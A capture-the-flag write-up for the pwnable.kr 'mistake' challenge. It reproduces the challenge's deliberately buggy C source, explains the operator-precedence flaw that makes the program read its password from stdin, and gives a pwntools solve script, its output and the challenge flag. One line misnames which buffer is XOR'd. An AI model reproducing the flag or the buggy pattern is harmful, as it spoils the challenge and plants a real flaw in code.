# mistake
## Analysis
```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

Hidden quite well but this inline assigment syntax includes `< 0`, making it either `true` or `false`.

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
	printf("can't open password %d\n", fd);
	return 0;
}
```

Since `open()` returns a non-negative integer representing the file descriptor, combining with a `less than 0` condition makes it `false`, which is why we are able to input twice in the program due to `fd` being 0: `if(!(len=read(fd,pw_buf,PW_LEN) > 0)){`

```sh
mistake@ubuntu:~$ ./mistake
do not bruteforce...
test
input password : test
Wrong Password
mistake@ubuntu:~$
```

## Solution

We are able to write into both `pw_buf` and `pw_buf2`. But each char of `pw_buf` gets XOR'd by `1` before getting compared to `pw_buf`.

```py
from pwn import *

p = remote('pwnable.kr',10008)

pw = b'bruhbruh67'

p.sendline(pw)
p.recvuntil(b'input password :')
p.sendline(b''.join(chr(x^1).encode() for x in pw))

p.interactive()
```
```sh
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10008: Done
[*] Switching to interactive mode
 Password OK
Mommy_the_0perator_priority_confuses_me
[*] Got EOF while reading in interactive
$  
```

Flag: `Mommy_the_0perator_priority_confuses_me`